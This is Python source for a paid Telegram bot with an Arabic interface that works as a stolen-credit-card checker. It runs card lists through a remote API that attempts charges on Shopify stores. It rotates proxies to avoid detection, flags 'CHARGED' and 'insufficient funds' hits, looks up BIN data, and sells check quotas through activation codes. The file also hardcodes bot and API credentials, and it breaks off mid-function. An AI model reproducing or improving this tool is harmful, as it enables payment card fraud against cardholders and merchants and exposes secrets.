import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import secrets
from datetime import datetime
from telethon import TelegramClient, events, Button

# ==================== إعدادات البوت ====================
CHECKER_API_URL = 'https://apiehopf-production.up.railway.app'

API_ID = 38208016
API_HASH = '0d52125034b6a0d0dac3e71b40cea032'
BOT_TOKEN = '8611645280:AAE30nGTwS1j8tyLkTE0o1iTN585AJ63h8k'
ADMIN_IDS = [1093032296]

PREMIUM_PRICE_STARS = 10000
DEFAULT_CHECK_LIMIT = 2000
ADMIN_MAX_CHECKS = 100000

bot = TelegramClient('joker_bot', API_ID, API_HASH)

# ==================== الملفات الأساسية للأدمن ====================
ADMIN_SITES_FILE = 'sites.txt'
ADMIN_PROXY_FILE = 'proxy.txt'

# ==================== دوال مساعدة ====================
def is_admin(user_id):
    return user_id in ADMIN_IDS

def load_admin_sites():
    if not os.path.exists(ADMIN_SITES_FILE):
        return []
    try:
        with open(ADMIN_SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_admin_sites(sites):
    with open(ADMIN_SITES_FILE, 'w', encoding='utf-8') as f:
        for site in sites:
            f.write(f"{site}\n")

def load_admin_proxies():
    if not os.path.exists(ADMIN_PROXY_FILE):
        return []
    try:
        with open(ADMIN_PROXY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_admin_proxies(proxies):
    with open(ADMIN_PROXY_FILE, 'w', encoding='utf-8') as f:
        for proxy in proxies:
            f.write(f"{proxy}\n")

USERS_FILE = 'users.json'
CODES_FILE = 'codes.json'

def get_user_sites_file(user_id):
    return f"user_{user_id}_sites.txt"

def get_user_proxy_file(user_id):
    return f"user_{user_id}_proxy.txt"

def load_user_sites(user_id):
    if is_admin(user_id):
        return load_admin_sites()
    file_path = get_user_sites_file(user_id)
    if not os.path.exists(file_path):
        return []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_user_sites(user_id, sites):
    if is_admin(user_id):
        save_admin_sites(sites)
        return
    file_path = get_user_sites_file(user_id)
    with open(file_path, 'w', encoding='utf-8') as f:
        for site in sites:
            f.write(f"{site}\n")

def load_user_proxies(user_id):
    if is_admin(user_id):
        return load_admin_proxies()
    file_path = get_user_proxy_file(user_id)
    if not os.path.exists(file_path):
        return []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_user_proxies(user_id, proxies):
    if is_admin(user_id):
        save_admin_proxies(proxies)
        return
    file_path = get_user_proxy_file(user_id)
    with open(file_path, 'w', encoding='utf-8') as f:
        for proxy in proxies:
            f.write(f"{proxy}\n")

def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def load_codes():
    if not os.path.exists(CODES_FILE):
        return {}
    try:
        with open(CODES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_codes(codes):
    with open(CODES_FILE, 'w', encoding='utf-8') as f:
        json.dump(codes, f, indent=2, ensure_ascii=False)

def get_user_checks_left(user_id):
    if is_admin(user_id):
        return ADMIN_MAX_CHECKS
    users = load_users()
    user_data = users.get(str(user_id), {})
    total_checks = user_data.get('total_checks', 0)
    limit = user_data.get('check_limit', DEFAULT_CHECK_LIMIT)
    return max(0, limit - total_checks)

def increment_user_checks(user_id, count=1):
    if is_admin(user_id):
        return
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {}
    users[user_id_str]['total_checks'] = users[user_id_str].get('total_checks', 0) + count
    save_users(users)

def generate_activation_code():
    return secrets.token_hex(8).upper()

def create_activation_code(checks_limit=DEFAULT_CHECK_LIMIT):
    codes = load_codes()
    code = generate_activation_code()
    codes[code] = {
        'checks_limit': checks_limit,
        'used': False,
        'used_by': None,
        'created_at': datetime.now().isoformat()
    }
    save_codes(codes)
    return code

def activate_code(user_id, code):
    if is_admin(user_id):
        return True, "أنت أدمن، لا تحتاج تفعيل!"
    codes = load_codes()
    if code not in codes:
        return False, "الكود غير صالح!"
    code_data = codes[code]
    if code_data.get('used', False):
        return False, "الكود مستخدم من قبل!"
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {}
    users[user_id_str]['premium'] = True
    users[user_id_str]['check_limit'] = code_data['checks_limit']
    users[user_id_str]['total_checks'] = users[user_id_str].get('total_checks', 0)
    users[user_id_str]['activated_at'] = datetime.now().isoformat()
    code_data['used'] = True
    code_data['used_by'] = user_id_str
    code_data['used_at'] = datetime.now().isoformat()
    save_users(users)
    save_codes(codes)
    return True, f"تم التفعيل بنجاح! لديك {code_data['checks_limit']} عملية فحص متاحة."

def is_user_blocked(user_id):
    if is_admin(user_id):
        return False
    users = load_users()
    user_data = users.get(str(user_id), {})
    return user_data.get('blocked', False)

def block_user(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {}
    users[user_id_str]['blocked'] = True
    save_users(users)

def unblock_user(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        users[user_id_str]['blocked'] = False
        save_users(users)

def get_all_users():
    users = load_users()
    return users

def is_premium_user(user_id):
    if is_admin(user_id):
        return True
    users = load_users()
    user_data = users.get(str(user_id), {})
    return user_data.get('premium', False)

def is_user_subscribed(user_id):
    """التحقق من اشتراك المستخدم"""
    if is_admin(user_id):
        return True
    return is_premium_user(user_id) and get_user_checks_left(user_id) > 0

async def create_user_if_not_exists(user_id, username):
    if is_admin(user_id):
        users = load_users()
        user_id_str = str(user_id)
        if user_id_str not in users:
            users[user_id_str] = {
                'user_id': user_id,
                'username': username,
                'registered_at': datetime.now().isoformat(),
                'total_checks': 0,
                'successful_checks': 0,
                'premium': True,
                'check_limit': ADMIN_MAX_CHECKS,
                'blocked': False,
                'is_admin': True
            }
            save_users(users)
            # إشعار الأدمن بدخول مستخدم جديد
            for admin_id in ADMIN_IDS:
                try:
                    await bot.send_message(admin_id, premium_emoji(f"🆕 <b>مستخدم جديد دخل البوت!</b>\n\n🆔 المعرف: <code>{user_id}</code>\n👤 اليوزر: @{username}\n📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"), parse_mode='html')
                except:
                    pass
        return
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {
            'user_id': user_id,
            'username': username,
            'registered_at': datetime.now().isoformat(),
            'total_checks': 0,
            'successful_checks': 0,
            'premium': False,
            'check_limit': 0,
            'blocked': False
        }
        save_users(users)
        # إشعار الأدمن بدخول مستخدم جديد
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(admin_id, premium_emoji(f"🆕 <b>مستخدم جديد دخل البوت!</b>\n\n🆔 المعرف: <code>{user_id}</code>\n👤 اليوزر: @{username}\n📅 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"), parse_mode='html')
            except:
                pass

# ==================== دوال API ====================

PREMIUM_EMOJI_IDS = {
    "✅": "5123163417326126159",
    "❌": "5121063440311386962",
    "🔥": "5116414868357907335",
    "⚡": "5219943216781995020",
    "💳": "5447453226498552490",
    "💠": "5870498447068502918",
    "📝": "5444860552310457690",
    "🌐": "5447602197439218445",
    "📊": "4911241630633165627",
    "📦": "5303102515301083665",
    "📋": "5305618829265628111",
    "⏳": "5303382628773161521",
    "🚀": "5303534082204920602",
    "⚠️": "5305473345838410805",
    "💎": "5305726937887433606",
    "👋": "5134653266591744867",
    "💡": "5231264265242954153",
    "📈": "5134457377428341766",
    "🔢": "5305652587708572354",
    "🔌": "5305622454218024328",
    "⭐": "5801104080646444587",
    "🆓": "5116382939571028928",
    "👑": "5303547611351902889",
    "🔍": "5305346287820895195",
    "⏱️": "5303243514782443814",
    "💥": "5122933683820430249",
    "🆔": "5447311106030726740",
    "👤": "5445174334031166029",
    "📅": "5082628525303792441",
    "🔄": "5454245266305604993",
    "🏦": "5303159080020372094",
    "🥰": "5881784744949062058",
    "😱": "5868517294618975202",
    "💰": "5303159080020372094",
}

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(
            emoji, 
            f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>'
        )
    return result

active_sessions = {}
user_current_check = {}

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'proxy dead', 'invalid proxy format', 'no proxy',
)

def get_main_menu_keyboard():
    return [
        [Button.inline("📋 الأوامر", b"show_commands")],
        [Button.url("𝗖𝗵𝗮𝗻𝗻𝗲𝗹", "https://t.me/JOKER")]
    ]

def get_commands_keyboard():
    return [
        [Button.inline("🔙 رجوع", b"main_menu")]
    ]

def get_admin_menu_keyboard():
    return [
        [Button.inline("📊 إحصائيات", b"admin_stats")],
        [Button.inline("📢 إذاعة", b"admin_broadcast")],
        [Button.inline("🔨 حظر", b"admin_block")],
        [Button.inline("🔓 إلغاء حظر", b"admin_unblock")],
        [Button.inline("📈 تعديل الحد", b"admin_set_limit")],
        [Button.inline("🔙 رجوع", b"main_menu")]
    ]

async def get_user_stats_text(user_id, username):
    users = load_users()
    user_data = users.get(str(user_id), {})
    total_checks = user_data.get('total_checks', 0)
    checks_left = get_user_checks_left(user_id)
    is_premium_user = user_data.get('premium', False) or is_admin(user_id)
    is_blocked = user_data.get('blocked', False)
    sites_count = len(load_user_sites(user_id))
    proxies_count = len(load_user_proxies(user_id))
    
    if is_blocked:
        status = "🚫 محظور"
    elif is_admin(user_id):
        status = "👑 أدمن | غير محدود"
    elif is_premium_user:
        status = f"⭐ مميز | {checks_left} عملية متبقية"
    else:
        status = "🆓 تجريبي | يرجى الاشتراك"
    
    text = f"👋 أهلاً بك , @{username}!\n\n"
    text += f"📊 حالتك:\n"
    text += f"    ┣ 📝 {status}\n"
    text += f"    ┣ 🌐 المواقع: {sites_count}\n"
    text += f"    ┣ 🔌 البروكسيات: {proxies_count}\n"  
    text += f"    ┣ 💥 إجمالي الفحوصات: {total_checks}\n"
    text += f"    ┗ 📈 العمليات المتبقية: {checks_left if not is_admin(user_id) else '♾️ غير محدود'}\n\n"
    text += f"💡 مطور البوت: @Joker"
    return text

# ==================== دوال API الرئيسية ====================

async def test_site(site, proxy):
    test_card = "4031630422575208|01|2030|280"
    try:
        if site.startswith('https://') or site.startswith('http://'):
            site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
        if proxy:
            url += f'&proxy={proxy}'
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'site': site, 'status': 'dead'}
                try:
                    raw = await resp.json()
                    if raw.get('Status', False):
                        return {'site': site, 'status': 'alive'}
                    else:
                        return {'site': site, 'status': 'dead'}
                except:
                    return {'site': site, 'status': 'dead'}
    except Exception:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    test_card = "4031630422575208|01|2030|280"
    test_site = "musicstore.myshopify.com"
    try:
        url = f'{CHECKER_API_URL}/shopify?site={test_site}&cc={test_card}'
        if proxy:
            url += f'&proxy={proxy}'
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'proxy': proxy, 'status': 'dead'}
                try:
                    raw = await resp.json()
                    # البروكسي شغال لو Status = True حتى لو الكارت اترفض
                    if raw.get('Status', False):
                        return {'proxy': proxy, 'status': 'alive'}
                    else:
                        return {'proxy': proxy, 'status': 'dead'}
                except:
                    return {'proxy': proxy, 'status': 'dead'}
    except Exception:
        return {'proxy': proxy, 'status': 'dead'}

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'site': site}

        if site.startswith('https://') or site.startswith('http://'):
            site = site.replace('https://', '').replace('http://', '').rstrip('/')

        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={card}'
        if proxy:
            url += f'&proxy={proxy}'
        
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Dead', 'message': f'HTTP Error: {resp.status}', 'card': card, 'site': site}
                try:
                    raw = await resp.json()
                except Exception as e:
                    return {'status': 'Dead', 'message': f'Invalid JSON: {str(e)}', 'card': card, 'site': site}

        response_msg = raw.get('Response', '')
        price = raw.get('Price', 0.0)
        gateway = raw.get('Gateway', 'Shopify')

        try:
            price_val = float(price)
            price = f"${price_val:.2f}"
        except:
            price = "-"

        charged_keywords = ['ORDER_PLACED', 'PROCESSEDRECEIPT', 'ORDER_CONFIRMED', 'SUCCESS', 'CHARGED']
        approved_keywords = ['INSUFFICIENT_FUNDS', 'INSUFFICIENT FUNDS']
        
        response_upper = response_msg.upper()
        
        # Charged
        if any(kw in response_upper for kw in charged_keywords):
            print(f"[✓] CHARGED: {card} | {response_msg} | {site}")
            return {
                'status': 'Charged', 
                'message': response_msg, 
                'card': card, 
                'site': site, 
                'gateway': gateway, 
                'price': price
            }
        # Approved (INSUFFICIENT_FUNDS فقط)
        elif any(kw in response_upper for kw in approved_keywords):
            print(f"[!] APPROVED (Insufficient Funds): {card} | {response_msg} | {site}")
            return {
                'status': 'Approved', 
                'message': response_msg, 
                'card': card, 
                'site': site, 
                'gateway': gateway, 
                'price': price
            }
        # أي حاجة تانية = Dead
        else:
            print(f"[✗] DEAD: {card} | {response_msg} | {site}")
            return {
                'status': 'Dead', 
                'message': response_msg if response_msg else 'Card Declined', 
                'card': card, 
                'site': site, 
                'gateway': gateway, 
                'price': price
            }

    except asyncio.TimeoutError:
        print(f"[!] TIMEOUT: {card}")
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'site': site, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        print(f"[!] ERROR: {card} | {error_msg}")
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'site': site, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'site': site, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'site': 'None'}
    if not proxies:
         return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'site': 'None'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)
        if not result.get('retry'):
            return result
        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-', 'site': 'None'}

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except:
                    return '-', '-', '-', '-', '-', ''
    except:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def send_hit_message(user_id, result, hit_type):
    """إرسال الـ Hit مع اسم الموقع"""
    if hit_type == 'Charged':
        emoji = "💎"
        status_text = "𝐂𝐇𝐀𝐑𝐆𝐄𝐃"
    else:
        emoji = "✅"
        status_text = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 (Insufficient Funds)"

    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    
    # اسم الموقع من النتيجة
    site_name = result.get('site', 'Unknown')

    message = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ 𝐇𝐢𝐭</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>🌐 Store: <code>{site_name}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 Gateway: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>💠 BIN Info</b>
<pre>Brand: {brand} - Type: {bin_type} - Level: {level}
Bank: {bank}
Country: {country} {flag}</pre>
"""

    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except:
        pass

# ==================== أوامر البوت الأساسية ====================

# قائمة الأوامر المسموحة قبل الاشتراك
ALLOWED_COMMANDS = ['/start', '/help', '/subscribe', '/redeem']

def is_command_allowed_before_subscribe(command):
    """التحقق إذا كان الأمر مسموح قبل الاشتراك"""
    for allowed in ALLOWED_COMMANDS:
        if command.startswith(allowed):
            return True
    return False

@bot.on(events.NewMessage)
async def check_subscription(event):
    """منع الأوامر قبل الاشتراك"""
    user_id = event.sender_id
    message_text = event.raw_text
    
    # الأدمن يستثنى
    if is_admin(user_id):
        return
    
    # أوامر معينة مسموحة
    if is_command_allowed_before_subscribe(message_text):
        return
    
    # التحقق من الاشتراك
    if not is_user_subscribed(user_id):
        await event.reply(premium_emoji("❌ <b>الوصول ممنوع</b>\n\nهذا البوت للمستخدمين المميزين فقط.\n\nللاشتراك استخدم الأمر /subscribe\nأو استخدم كود التفعيل: /redeem الكود"), parse_mode='html')
        raise events.StopPropagation

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    await create_user_if_not_exists(user_id, username)
    stats_text = await get_user_stats_text(user_id, username)
    await event.reply(
        premium_emoji(stats_text),
        buttons=get_main_menu_keyboard(),
        parse_mode='html'
    )

@bot.on(events.CallbackQuery)
async def handle_menu_callback(event):
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    
    # التحقق من الحظر
    if is_user_blocked(user_id) and not is_admin(user_id) and data not in ["admin_stats", "admin_broadcast", "admin_block", "admin_unblock", "admin_set_limit"]:
        await event.answer("🚫 تم حظرك من البوت", alert=True)
        return
    
    # التحقق من الاشتراك للأزرار
    if not is_admin(user_id) and not is_user_subscribed(user_id) and data not in ["show_commands", "main_menu"]:
        await event.answer("❌ غير مشترك! استخدم /subscribe", alert=True)
        return
    
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    if data == "show_commands":
        commands_text = """<b>📋 الأوامر الأساسية</b>
├ <code>/start</code> - القائمة الرئيسية
├ <code>/help</code> - المساعدة
├ <code>/profile</code> - ملفك الشخصي
├ <code>/mysites</code> - مواقعي
├ <code>/myproxy</code> - بروكسياتي

<b>🌐 إدارة المواقع</b>
├ <code>/site domain</code> - إضافة موقع
├ <code>/sitecheck</code> - فحص المواقع
├ <code>/rmsite url</code> - حذف موقع
├ <code>/addsites</code> - رفع ملف مواقع
├ <code>/clearsites</code> - حذف كل المواقع

<b>🔌 إدارة البروكسيات</b>
├ <code>/proxy</code> - فحص البروكسيات
├ <code>/addproxy</code> - إضافة بروكسي
├ <code>/addproxies</code> - رفع ملف بروكسيات
├ <code>/rmproxy proxy</code> - حذف بروكسي
├ <code>/clearproxy</code> - حذف الكل

<b>💳 فحص الكروت</b>
├ <code>/cc card|mm|yy|cvv</code> - فحص كارت
├ <code>/chk</code> - فحص ملف (رد على .txt)
└ <code>/mcancel</code> - إلغاء الفحص

<b>⭐ الاشتراك</b>
├ <code>/subscribe</code> - شراء اشتراك
├ <code>/redeem كود</code> - تفعيل كود

<b>📝 الصيغ</b>
├ CC: <code>card|mm|yyyy|cvv</code>
└ Proxy: <code>ip:port</code> أو <code>ip:port:user:pass</code>"""
        if is_admin(user_id):
            commands_text += """

<b>👑 أوامر الأدمن</b>
├ <code>/admin</code> - لوحة التحكم
├ <code>/gencode عدد</code> - إنشاء كود
├ <code>/block معرف</code> - حظر مستخدم
├ <code>/unblock معرف</code> - إلغاء حظر
├ <code>/broadcast رسالة</code> - إذاعة
├ <code>/setlimit معرف عدد</code> - تعديل الحد
├ <code>/users</code> - عرض المستخدمين
├ <code>/user معرف</code> - عرض بيانات مستخدم
└ <code>/stats</code> - إحصائيات البوت"""
        await event.edit(premium_emoji(commands_text), buttons=get_commands_keyboard(), parse_mode='html')
        await event.answer()
    
    elif data == "main_menu":
        stats_text = await get_user_stats_text(user_id, username)
        await event.edit(premium_emoji(stats_text), buttons=get_main_menu_keyboard(), parse_mode='html')
        await event.answer()

@bot.on(events.NewMessage(pattern='/help'))
async def help_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    
    help_text = """<b>📋 الأوامر الأساسية</b>

├ <code>/start</code> - القائمة الرئيسية
├ <code>/help</code> - هذه المساعدة
├ <code>/profile</code> - ملفك الشخصي
├ <code>/mysites</code> - عرض مواقعي
├ <code>/myproxy</code> - عرض بروكسياتي

<b>🌐 إدارة المواقع</b>
├ <code>/site domain</code> - إضافة موقع
├ <code>/sitecheck</code> - فحص المواقع وإزالة الميت
├ <code>/rmsite url</code> - حذف موقع محدد
├ <code>/addsites</code> - رفع ملف .txt يحتوي على مواقع
├ <code>/clearsites</code> - حذف جميع المواقع

<b>🔌 إدارة البروكسيات</b>
├ <code>/proxy</code> - فحص البروكسيات وإزالة الميت
├ <code>/addproxy</code> - إضافة بروكسي (سطر بسطر)
├ <code>/addproxies</code> - رفع ملف .txt يحتوي على بروكسيات
├ <code>/chkproxy proxy</code> - فحص بروكسي واحد
├ <code>/rmproxy proxy</code> - حذف بروكسي واحد
├ <code>/clearproxy</code> - حذف جميع البروكسيات
├ <code>/getproxy</code> - عرض جميع البروكسيات

<b>💳 فحص الكروت</b>
├ <code>/cc cc|mm|yy|cvv</code> - فحص كارت واحد
├ <code>/chk</code> - فحص ملف كروت (رد على ملف .txt)
└ <code>/mcancel</code> - إلغاء الفحص الجماعي

<b>⭐ الاشتراك</b>
├ <code>/subscribe</code> - شراء اشتراك بـ 10000 نجمة
└ <code>/redeem كود</code> - تفعيل كود اشتراك

<b>📝 الصيغ</b>
├ CC: <code>card|mm|yyyy|cvv</code>
└ Proxy: <code>ip:port</code> أو <code>ip:port:user:pass</code>"""
    if is_admin(user_id):
        help_text += """

<b>👑 أوامر الأدمن</b>
├ <code>/admin</code> - لوحة تحكم الأدمن
├ <code>/gencode عدد_الفحوصات</code> - إنشاء كود تفعيل
├ <code>/block معرف_المستخدم</code> - حظر مستخدم
├ <code>/unblock معرف_المستخدم</code> - إلغاء حظر
├ <code>/broadcast نص</code> - إذاعة رسالة للجميع
├ <code>/setlimit معرف_المستخدم عدد</code> - تعديل عدد الفحوصات
├ <code>/users</code> - عرض قائمة المستخدمين
├ <code>/user معرف_المستخدم</code> - عرض بيانات مستخدم
└ <code>/stats</code> - إحصائيات البوت"""
    
    await event.reply(premium_emoji(help_text), buttons=get_commands_keyboard(), parse_mode='html')

@bot.on(events.NewMessage(pattern='/profile'))
async def profile_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    
    users = load_users()
    user_data = users.get(str(user_id), {})
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
        first_name = sender.first_name if sender.first_name else "User"
    except:
        username = f"user_{user_id}"
        first_name = "User"
    total_checks = user_data.get('total_checks', 0)
    successful_checks = user_data.get('successful_checks', 0)
    registered_at = user_data.get('registered_at', datetime.now().isoformat())[:10]
    checks_left = get_user_checks_left(user_id)
    is_premium_user = user_data.get('premium', False) or is_admin(user_id)
    check_limit = user_data.get('check_limit', 0) if not is_admin(user_id) else "غير محدود"
    sites_count = len(load_user_sites(user_id))
    proxies_count = len(load_user_proxies(user_id))
    text = f"""<b>👤 ملف المستخدم</b>

├ 🆔 المعرف: <code>{user_id}</code>
├ 👤 الاسم: {first_name}
├ 📝 اليوزر: @{username}
├ 📊 إجمالي الفحوصات: {total_checks}
├ 💎 النتائج الناجحة: {successful_checks}
├ 🌐 المواقع المضافة: {sites_count}
├ 🔌 البروكسيات المضافة: {proxies_count}
├ ⭐ الحالة: {'👑 أدمن' if is_admin(user_id) else '✅ مميز' if is_premium_user else '❌ تجريبي'}
├ 📈 الحد الأقصى للفحص: {check_limit}
├ 💳 العمليات المتبقية: {checks_left if not is_admin(user_id) else '♾️ غير محدود'}
└ 📅 تاريخ التسجيل: {registered_at}"""
    await event.reply(premium_emoji(text), buttons=get_commands_keyboard(), parse_mode='html')

@bot.on(events.NewMessage(pattern='/mysites'))
async def mysites_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    
    sites = load_user_sites(user_id)
    if not sites:
        await event.reply(premium_emoji("❌ لا توجد مواقع. استخدم /site لإضافة موقع."), parse_mode='html')
        return
    sites_text = '\n'.join([f"• {site}" for site in sites])
    if len(sites_text) > 4000:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"sites_{user_id}_{timestamp}.txt"
        async with aiofiles.open(filename, 'w') as f:
            await f.write('\n'.join(sites))
        await event.reply(premium_emoji(f"📋 <b>مواقعك ({len(sites)}):</b>"), file=filename, parse_mode='html')
        try:
            os.remove(filename)
        except:
            pass
    else:
        await event.reply(premium_emoji(f"📋 <b>مواقعك:</b>\n\n{sites_text}"), buttons=get_commands_keyboard(), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearsites'))
async def clear_sites_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    
    current_sites = load_user_sites(user_id)
    count = len(current_sites)
    if count == 0:
        await event.reply(premium_emoji("❌ لا توجد مواقع لحذفها."), parse_mode='html')
        return
    
    save_user_sites(user_id, [])
    await event.reply(premium_emoji(f"✅ <b>تم حذف جميع المواقع ({count})!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/myproxy'))
async def myproxy_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply(premium_emoji("❌ لا توجد بروكسيات. استخدم /addproxy لإضافة بروكسي."), parse_mode='html')
        return
    if len(proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        await event.reply(premium_emoji(f"<b>📋 بروكسياتك ({len(proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(proxies):
                await f.write(f"{i+1}. {proxy}\n")
